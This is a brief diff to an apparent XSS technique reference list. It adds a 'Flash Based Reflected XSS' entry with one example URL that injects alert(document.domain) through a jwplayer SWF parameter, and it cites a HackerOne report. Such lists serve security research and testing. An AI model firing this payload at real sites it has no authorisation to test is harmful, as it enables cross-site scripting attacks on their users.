@@ -37,6 +37,14 @@ https://brutelogic.com.br/blog/xss-via-http-headers/
 ```
 https://medium.com/@youghourtaghannei/postmessage-xss-vulnerability-on-private-program-18e773e1a1ba
 ```
+## 7. Flash Based Reflected XSS
+```
+http://www.domain.com/jwplayer/player.swf?playerready=alert(document.domain)
+```
+https://hackerone.com/reports/859806
+
+
+
 
 
 
